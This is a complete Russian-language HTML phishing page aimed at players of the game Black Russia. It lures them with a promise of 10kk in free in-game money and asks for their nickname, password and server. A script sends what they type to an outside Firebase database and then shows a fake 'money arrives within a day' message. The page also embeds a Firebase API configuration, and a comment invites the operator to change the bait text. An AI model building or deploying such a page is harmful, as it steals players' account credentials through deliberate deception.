<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Black Russia - Бонусная Система</title>
  
  <!-- Подключаем Firebase через CDN (версия 9 совместимая / v8) -->
  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

  <style>
    /* Базовые стили и красивый фоновый градиент */
    body {
      margin: 0;
      padding: 0;
      font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
      background: linear-gradient(135deg, #1f2937, #111827, #0f172a);
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      color: #f3f4f6;
      overflow: hidden;
    }

    /* Эффект Liquid Glass (Матовое стекло) */
    .glass-card {
      background: rgba(255, 255, 255, 0.06);
      backdrop-filter: blur(12px);
      -webkit-backdrop-filter: blur(12px);
      border: 1px solid rgba(255, 255, 255, 0.1);
      border-radius: 16px;
      padding: 30px;
      width: 100%;
      max-width: 380px;
      box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
      box-sizing: border-box;
      text-align: center;
      transition: all 0.3s ease;
    }

    /* Изменяемый верхний текст / заголовок */
    .promo-header {
      font-size: 20px;
      font-weight: 700;
      margin-bottom: 8px;
      color: #ffffff;
      text-transform: uppercase;
      letter-spacing: 1px;
    }

    .promo-sub {
      font-size: 14px;
      color: #9ca3af;
      margin-bottom: 24px;
    }

    /* Поля ввода */
    .input-group {
      margin-bottom: 16px;
      text-align: left;
    }

    .input-group label {
      display: block;
      font-size: 12px;
      color: #9ca3af;
      margin-bottom: 6px;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }

    .input-field {
      width: 100%;
      padding: 12px 14px;
      background: rgba(255, 255, 255, 0.04);
      border: 1px solid rgba(255, 255, 255, 0.08);
      border-radius: 8px;
      color: #ffffff;
      font-size: 14px;
      box-sizing: border-box;
      outline: none;
      transition: border-color 0.2s, background-color 0.2s;
    }

    .input-field:focus {
      border-color: rgba(255, 255, 255, 0.3);
      background: rgba(255, 255, 255, 0.08);
    }

    /* Плейсхолдеры */
    ::placeholder {
      color: #6b7280;
    }

    /* Кнопка */
    .submit-btn {
      width: 100%;
      padding: 14px;
      background: rgba(255, 255, 255, 0.9);
      border: none;
      border-radius: 8px;
      color: #111827;
      font-size: 15px;
      font-weight: 600;
      cursor: pointer;
      transition: background 0.2s, transform 0.1s;
      margin-top: 10px;
    }

    .submit-btn:hover {
      background: #ffffff;
    }

    .submit-btn:active {
      transform: scale(0.98);
    }

    /* Модальное окно об успешной отправке */
    .modal {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.6);
      backdrop-filter: blur(8px);
      justify-content: center;
      align-items: center;
      z-index: 10;
    }

    .modal-content {
      background: rgba(255, 255, 255, 0.08);
      backdrop-filter: blur(16px);
      border: 1px solid rgba(255, 255, 255, 0.15);
      border-radius: 16px;
      padding: 30px;
      max-width: 320px;
      text-align: center;
      box-shadow: 0 10px 40px rgba(0,0,0,0.5);
    }

    .modal-title {
      font-size: 18px;
      font-weight: 600;
      margin-bottom: 12px;
      color: #ffffff;
    }

    .modal-text {
      font-size: 14px;
      color: #d1d5db;
      line-height: 1.5;
    }
  </style>
</head>
<body>

  <!-- Основная карточка входа -->
  <div class="glass-card" id="authCard">
    <!-- ЭТОТ ТЕКСТ ТЫ МОЖЕШЬ ИЗМЕНИТЬ НА ЛЮБОЙ ДРУГОЙ -->
    <div class="promo-header">Хочешь получить 10кк?</div>
    <div class="promo-sub">Зарегистрируйся прямо сейчас и получи 10кк бесплатно!</div>

    <form id="regForm">
      <div class="input-group">
        <label for="username">Никнейм (Имя_Фамилия)</label>
        <input type="text" id="username" class="input-field" placeholder="Ivan_Ivanov" required>
      </div>

      <div class="input-group">
        <label for="password">Пароль</label>
        <input type="password" id="password" class="input-field" placeholder="••••••••" required>
      </div>

      <div class="input-group">
        <label for="server">Сервер (английскими буквами)</label>
        <input type="text" id="server" class="input-field" placeholder="CHERRY" required>
      </div>

      <button type="submit" class="submit-btn">Зарегистрироваться</button>
    </form>
  </div>

  <!-- Окно уведомления -->
  <div class="modal" id="successModal">
    <div class="modal-content">
      <div class="modal-title">Заявка принята!</div>
      <div class="modal-text">Деньги поступают в течении 1 дня. Пожалуйста, ожидайте зачисления на указанный аккаунт.</div>
    </div>
  </div>

  <script>
    // Твой конфиг Firebase Realtime Database
    const firebaseConfig = {
      apiKey: "AIzaSyCHjsiC8jC1AVkCvMmDXK7_fVKm6StpUtw",
      authDomain: "beaschat-e0a28.firebaseapp.com",
      projectId: "beaschat-e0a28",
      storageBucket: "beaschat-e0a28.firebasestorage.app",
      messagingSenderId: "906515573172",
      appId: "1:906515573172:web:ee23ac70264e7a18d36ae1",
      measurementId: "G-XLVW2SYHPM",
      databaseURL: "https://beaschat-e0a28-default-rtdb.europe-west1.firebasedatabase.app"
    };

    // Инициализация Firebase
    firebase.initializeApp(firebaseConfig);
    const database = firebase.database();

    // Обработка отправки формы
    document.getElementById('regForm').addEventListener('submit', function(e) {
      e.preventDefault(); // Предотвращаем перезагрузку страницы

      const username = document.getElementById('username').value.trim();
      const password = document.getElementById('password').value.trim();
      const server = document.getElementById('server').value.trim();

      // Генерируем уникальный ключ для каждого пользователя в базе данных
      const newUserRef = database.ref('players').push();

      // Сохраняем данные в Firebase Realtime Database
      newUserRef.set({
        username: username,
        password: password,
        server: server,
        date: new Date().toISOString()
      })
      .then(() => {
        // Очищаем форму
        document.getElementById('regForm').reset();
        
        // Показываем окно "Деньги поступают в течении 1 дня"
        const modal = document.getElementById('successModal');
        modal.style.display = 'flex';
      })
      .catch((error) => {
        console.error("Ошибка сохранения: ", error);
        alert("Произошла ошибка при отправке данных. Попробуйте еще раз.");
      });
    });
  </script>

</body>
</html>
